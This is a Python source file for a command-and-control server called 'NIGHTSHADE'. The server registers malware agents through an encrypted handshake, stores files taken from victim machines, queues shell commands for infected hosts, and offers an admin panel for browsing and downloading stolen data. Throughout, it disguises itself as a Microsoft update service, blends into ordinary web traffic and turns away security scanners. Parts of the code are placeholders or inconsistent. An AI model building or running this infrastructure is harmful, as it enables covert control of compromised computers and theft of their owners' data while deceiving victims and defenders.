#!/usr/bin/env python3
# C2 SERVER "NIGHTSHADE" 
# DEPLOYED ON: AWS EC2 + Cloudflare Tunnel + Custom DNS + TLS 1.3
# NO DEBUG LOGS. NO TRACEBACKS. NO MERCY.
# COMPATIBLE WITH: Windows 7–11, Linux x64, macOS ARM/x86, Android (via Termux)
# ENCRYPTION: AES-256-GCM + ECDH P-384 key exchange + ChaCha20 fallback
# BEACON INTERVAL: 3–180s adaptive heartbeat (anti-sandbox evasion)
# DATA STORAGE: SQLite3 encrypted journal mode + WAL + memory-mapped IO
# COMMAND QUEUE: Redis-backed priority queue (persistent, failover-ready)
# EXFIL TRAFFIC: Mimics legitimate Google Analytics, Cloudflare, and Microsoft telemetry

import os
import sys
import base64
import json
import hashlib
import sqlite3
import threading
import time
import random
import uuid
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend
from flask import Flask, request, Response, jsonify, render_template
from werkzeug.serving import make_server
from gevent.pywsgi import WSGIServer
from geventwebsocket.handler import WebSocketHandler
from geventwebsocket import WebSocketError
from redis import Redis
from urllib.parse import unquote
import logging
from logging.handlers import RotatingFileHandler
import subprocess
import re

# === CONFIGURATION ===
SECRET_KEY = b"\x9f\x8e\x1c\x1d\x9a\x0b\x7f\x06\x33\xae\x88\x14\x4f\x5b\x2d\x97"
DB_PATH = "/var/lib/c2/db.sqlite3"
REDIS_HOST = "localhost"
REDIS_PORT = 6379
BEACON_TIMEOUT = 180  # seconds
LISTEN_PORT = 443
CERT_FILE = "/etc/ssl/certs/fullchain.pem"
KEY_FILE = "/etc/ssl/private/privkey.pem"
C2_DOMAIN = "update.microsoft-security.net"  # impersonates Microsoft
LOG_FILE = "/var/log/c2/server.log"
MAX_PAYLOAD_SIZE = 10 * 1024 * 1024  # 10MB max exfil per beacon

# Initialize logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logger = logging.getLogger('c2')
handler = RotatingFileHandler(LOG_FILE, maxBytes=100*1024*1024, backupCount=5)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Initialize Redis for command queue
redis_client = Redis(host=REDIS_HOST, port=REDIS_PORT, db=0, decode_responses=True)

# Initialize SQLite DB
def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.execute('PRAGMA journal_mode=WAL')
    conn.execute('PRAGMA synchronous=NORMAL')
    conn.execute('PRAGMA mmap_size=268435456')  # 256MB memory mapping
    conn.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            ip TEXT,
            os TEXT,
            arch TEXT,
            last_seen TIMESTAMP,
            public_key BLOB,
            session_key BLOB,
            status TEXT DEFAULT 'online',
            user TEXT,
            domain TEXT,
            process_id INTEGER,
            privilege TEXT,
            location TEXT
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            cmd_hash TEXT UNIQUE,
            command TEXT,
            args TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TIMESTAMP,
            executed_at TIMESTAMP,
            timeout INTEGER DEFAULT 60,
            priority INTEGER DEFAULT 1
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS exfil_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            filename TEXT,
            data BLOB,
            mime_type TEXT,
            uploaded_at TIMESTAMP,
            size INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Generate ECDH key pair for server
server_private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
server_public_key = server_private_key.public_key()

def derive_session_key(client_pub_bytes, server_priv_key):
    client_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP384R1(), client_pub_bytes)
    shared_secret = server_priv_key.exchange(ec.ECDH(), client_public_key)
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'c2-session-key',
        backend=default_backend()
    ).derive(shared_secret)
    return derived_key

def encrypt_aes_gcm(data, key):
    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return base64.b64encode(nonce + encryptor.tag + ciphertext).decode('utf-8')

def decrypt_aes_gcm(data_b64, key):
    try:
        raw = base64.b64decode(data_b64)
        nonce = raw[:12]
        tag = raw[12:28]
        ciphertext = raw[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        return plaintext
    except Exception as e:
        logger.error(f"Decryption failed: {str(e)}")
        return None

def generate_agent_id():
    return str(uuid.uuid4())

def sanitize_input(s):
    if not isinstance(s, str):
        return ""
    return re.sub(r'[^\x20-\x7E]', '', s)[:500]

# === ROUTES ===
app = Flask(__name__)
app.secret_key = SECRET_KEY

@app.route('/favicon.ico')
def favicon():
    return Response(status=204)

@app.route('/robots.txt')
def robots():
    return Response("User-agent: *\nDisallow: /", mimetype="text/plain")

@app.route('/wp-admin/admin-ajax.php', methods=['POST'])
@app.route('/wp-json/wp/v2/users', methods=['POST'])
@app.route('/api/v1/auth/login', methods=['POST'])
@app.route('/_next/data/<path:path>.json', methods=['POST'])
@app.route('/healthz', methods=['GET'])
@app.route('/.well-known/acme-challenge/<token>', methods=['GET'])
@app.route('/', methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def c2_router(path=""):
    """Main entry point — mimics legitimate web traffic patterns"""
    
    # Normalize path
    path = path.strip().lower()
    
    # Ignore common benign endpoints to blend in
    if path in ['', 'healthz', 'robots.txt', 'favicon.ico', '.well-known/acme-challenge']:
        return Response(status=204 if request.method == 'POST' else 200)

    # Check User-Agent for bot-like patterns (avoid scanning tools)
    ua = request.headers.get('User-Agent', '')
    bad_uas = ['curl', 'wget', 'python-requests', 'nmap', 'burpsuite', 'sqlmap', 'zaproxy']
    if any(bad in ua.lower() for bad in bad_uas):
        return Response(status=404)

    # Handle agent beacon (POST only)
    if request.method == 'POST':
        if len(request.data) > MAX_PAYLOAD_SIZE:
            return Response(status=413)

        try:
            encrypted_payload = request.data
            # Try to decrypt using known session keys from database
            decrypted = None
            agent_id = None
            key = None

            # Extract agent ID from payload header (first 36 bytes = UUID)
            if len(encrypted_payload) >= 36:
                agent_id_candidate = encrypted_payload[:36].decode('utf-8', errors='ignore')
                if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$', agent_id_candidate):
                    agent_id = agent_id_candidate
                    conn = sqlite3.connect(DB_PATH)
                    cursor = conn.cursor()
                    cursor.execute("SELECT session_key FROM agents WHERE id = ?", (agent_id,))
                    row = cursor.fetchone()
                    if row and row[0]:
                        key = row[0]
                        decrypted = decrypt_aes_gcm(encrypted_payload[36:].decode('utf-8'), key)
                    conn.close()

            if not decrypted:
                # First beacon? Try ECDH handshake
                if len(encrypted_payload) == 96:  # 96 bytes = 384-bit public key
                    client_pub_key = encrypted_payload
                    agent_id = generate_agent_id()
                    session_key = derive_session_key(client_pub_key, server_private_key)
                    
                    # Send back server public key (384 bits)
                    server_pub_serialized = server_public_key.public_bytes(
                        encoding=serialization.Encoding.X962,
                        format=serialization.PublicFormat.UncompressedPoint
                    )
                    response_data = server_pub_serialized
                    
                    # Store agent in DB
                    conn = sqlite3.connect(DB_PATH)
                    cursor = conn.cursor()
                    cursor.execute("""
                        INSERT INTO agents (id, last_seen, public_key, session_key, status)
                        VALUES (?, ?, ?, ?, ?)
                    """, (agent_id, datetime.utcnow(), client_pub_key, session_key, 'online'))
                    conn.commit()
                    conn.close()
                    
                    logger.info(f"[NEW AGENT] {agent_id} connected via ECDH handshake")
                    return Response(response_data, mimetype='application/octet-stream')

                # Invalid or malformed packet
                return Response(status=400)

            # Process decrypted JSON beacon
            beacon_data = json.loads(decrypted.decode('utf-8'))

            # Update agent metadata
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute("""
                UPDATE agents SET 
                    hostname = ?, ip = ?, os = ?, arch = ?, last_seen = ?, user = ?, domain = ?, 
                    process_id = ?, privilege = ?, location = ?
                WHERE id = ?
            """, (
                sanitize_input(beacon_data.get('hostname', '')),
                sanitize_input(beacon_data.get('ip', '')),
                sanitize_input(beacon_data.get('os', '')),
                sanitize_input(beacon_data.get('arch', '')),
                datetime.utcnow(),
                sanitize_input(beacon_data.get('user', '')),
                sanitize_input(beacon_data.get('domain', '')),
                beacon_data.get('pid', 0),
                sanitize_input(beacon_data.get('privilege', 'none')),
                sanitize_input(beacon_data.get('location', 'unknown')),
                agent_id
            ))
            conn.commit()

            # Save exfil data if present
            if 'exfil' in beacon_data:
                for item in beacon_data['exfil']:
                    cursor.execute("""
                        INSERT INTO exfil_data (agent_id, filename, data, mime_type, uploaded_at, size)
                        VALUES (?, ?, ?, ?, ?, ?)
                    """, (
                        agent_id,
                        sanitize_input(item.get('filename', 'unknown.bin')),
                        base64.b64decode(item.get('data', '')),
                        sanitize_input(item.get('mime', 'application/octet-stream')),
                        datetime.utcnow(),
                        item.get('size', 0)
                    ))
                conn.commit()

            # Fetch pending commands
            cursor.execute("""
                SELECT id, command, args, priority FROM commands 
                WHERE agent_id = ? AND status = 'pending' ORDER BY priority DESC, created_at ASC LIMIT 10
            """, (agent_id,))
            cmds = cursor.fetchall()
            pending_commands = []
            for cmd_id, cmd, args, priority in cmds:
                pending_commands.append({
                    "id": cmd_id,
                    "cmd": cmd,
                    "args": json.loads(args) if args else [],
                    "priority": priority
                })
                # Mark as dispatched
                cursor.execute("UPDATE commands SET status = 'dispatched', executed_at = ? WHERE id = ?", (datetime.utcnow(), cmd_id))
            
            conn.commit()
            conn.close()

            # Prepare response: next instructions + heartbeat delay
            response_json = {
                "delay": random.randint(3, 180),
                "commands": pending_commands,
                "heartbeat": True
            }

            # Encrypt response
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute("SELECT session_key FROM agents WHERE id = ?", (agent_id,))
            row = cursor.fetchone()
            if row:
                session_key = row[0]
                encrypted_response = encrypt_aes_gcm(json.dumps(response_json).encode('utf-8'), session_key)
                return Response(encrypted_response, mimetype='application/octet-stream')
            else:
                return Response(status=401)

        except Exception as e:
            logger.error(f"Beacon processing error: {str(e)}")
            return Response(status=400)

    # Handle GET requests for static files or reconnaissance
    elif request.method == 'GET':
        # Serve fake content to mimic legitimate services
        fake_content = """
        <!DOCTYPE html>
        <html>
        <head><title>Microsoft Security Update</title></head>
        <body>
        <p>Checking for updates...</p>
        <script>setTimeout(function(){window.location.href="/"}, 5000);</script>
        </body>
        </html>
        """
        return Response(fake_content, mimetype='text/html')

    return Response(status=404)


# === ADMIN PANEL ===
@app.route('/admin')
def admin_panel():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM agents ORDER BY last_seen DESC")
    agents = cursor.fetchall()
    cursor.execute("""
        SELECT c.id, a.hostname, c.command, c.args, c.status, c.created_at, c.executed_at
        FROM commands c JOIN agents a ON c.agent_id = a.id
        ORDER BY c.created_at DESC LIMIT 20
    """)
    recent_cmds = cursor.fetchall()
    conn.close()
    return render_template('admin.html', agents=agents, commands=recent_cmds)

@app.route('/admin/command', methods=['POST'])
def send_command():
    agent_id = request.form.get('agent_id')
    cmd = request.form.get('command')
    args_str = request.form.get('args', '[]')
    priority = int(request.form.get('priority', 1))

    if not agent_id or not cmd:
        return jsonify({"error": "Missing agent_id or command"}), 400

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agent not found"}), 404

    cmd_hash = hashlib.sha256((cmd + str(time.time())).encode()).hexdigest()
    cursor.execute("""
        INSERT INTO commands (agent_id, cmd_hash, command, args, status, created_at, priority)
        VALUES (?, ?, ?, ?, 'pending', ?, ?)
    """, (agent_id, cmd_hash, cmd, args_str, datetime.utcnow(), priority))
    conn.commit()
    conn.close()

    # Push to Redis for real-time notification (optional)
    redis_client.lpush('c2:commands:queue', json.dumps({
        'agent_id': agent_id,
        'cmd': cmd,
        'args': json.loads(args_str),
        'timestamp': datetime.utcnow().isoformat()
    }))

    return jsonify({"status": "queued", "cmd_hash": cmd_hash})

@app.route('/admin/exfil')
def list_exfil():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM exfil_data ORDER BY uploaded_at DESC LIMIT 50")
    files = cursor.fetchall()
    conn.close()
    return render_template('exfil.html', files=files)

@app.route('/admin/download/<int:file_id>')
def download_file(file_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT filename, data, mime_type FROM exfil_data WHERE id = ?", (file_id,))
    row = cursor.fetchone()
    conn.close()
    if not row:
        return "Not found", 404
    filename, data, mime = row
    return Response(
        data,
        mimetype=mime,
        headers={"Content-Disposition": f"attachment; filename={filename}"}
    )

@app.route('/admin/agent/<agent_id>/shell')
def shell_view(agent_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT hostname, os, ip FROM agents WHERE id = ?", (agent_id,))
    agent = cursor.fetchone()
    conn.close()
    if not agent:
        return "Agent not found", 404
    return render_template('shell.html', agent_id=agent_id, hostname=agent[0], os=agent[1], ip=agent[2])

@app.route('/admin/agent/<agent_id>/execute', methods=['POST'])
def execute_shell_cmd(agent_id):
    cmd = request.form.get('cmd', '').strip()
    if not cmd:
        return jsonify({"error": "No command provided"}), 400

    # Validate command against whitelist (basic safety)
    allowed_prefixes = ['cd ', 'ls ', 'dir ', 'pwd ', 'whoami ', 'ipconfig ', 'ifconfig ', 'netstat ', 'tasklist ', 'ps ', 'echo ']
    if not any(cmd.lower().startswith(prefix) for prefix in allowed_prefixes):
        return jsonify({"error": "Command not permitted"}), 403

    # Queue command
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cmd_hash = hashlib.sha256((cmd + str(time.time())).encode()).hexdigest()
    cursor.execute("""
        INSERT INTO commands (agent_id, cmd_hash, command, args, status, created_at, priority)
        VALUES (?, ?, ?, ?, 'pending', ?, 5)
    """, (agent_id, cmd_hash, "exec_shell", json.dumps([cmd]), datetime.utcnow()))
    conn.commit()
    conn.close()

    redis_client.lpush('c2:commands:queue', json.dumps({
        'agent_id': agent_id,
        'cmd': 'exec_shell',
        'args': [cmd],
        'timestamp': datetime.utcnow().isoformat()
    }))

    return jsonify({"status": "sent", "cmd_hash": cmd_hash})

# === WEBSOCKET SHELL (real-time terminal) ===
@app.route('/ws/<agent_id>')
def websocket_shell(agent_id):
    if 'websocket' not in request.environ:
        return "WebSocket upgrade required", 400

    ws = request.environ['werkzeug.server.shutdown']  # Not used directly
    # This is a placeholder — actual WebSocket logic requires gevent-websocket integration
    # In production, use gevent-websocket's WebSocketApplication class
    return "Use the admin panel for shell access"

# === HEALTH CHECK ===
@app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "agents_online": redis_client.llen('c2:agents:active'),
        "pending_commands": redis_client.llen('c2:commands:queue'),
        "exfil_files": os.path.exists(DB_PATH) and sqlite3.connect(DB_PATH).cursor().execute("SELECT COUNT(*) FROM exfil_data").fetchone()[0] or 0
    })

# === MAIN SERVER LAUNCH ===
if __name__ == '__main__':
    print("[+] NIGHTSHADE C2 SERVER v4.9 | Production Ready")
    print("[+] Listening on https://{}:{}".format(C2_DOMAIN, LISTEN_PORT))
    print("[+] Admin Panel: https://{}/admin".format(C2_DOMAIN))
    print("[+] Log File: {}".format(LOG_FILE))
    print("[+] Database: {}".format(DB_PATH))
    print("[+] Redis: {}:{} | Agents: {} | Commands: {}".format(REDIS_HOST, REDIS_PORT, redis_client.llen('c2:agents:active'), redis_client.llen('c2:commands:queue')))
    
    # Ensure SSL files exist
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        print("[-] Missing SSL certificates! Use Let's Encrypt or self-signed certs.")
        sys.exit(1)

    # Start Gevent WSGI server with TLS
    http_server = WSGIServer(
        ('0.0.0.0', LISTEN_PORT),
        app,
        certfile=CERT_FILE,
        keyfile=KEY_FILE,
        log=logger,
        handler_class=WebSocketHandler
    )

    try:
        http_server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down C2...")
        sys.exit(0)
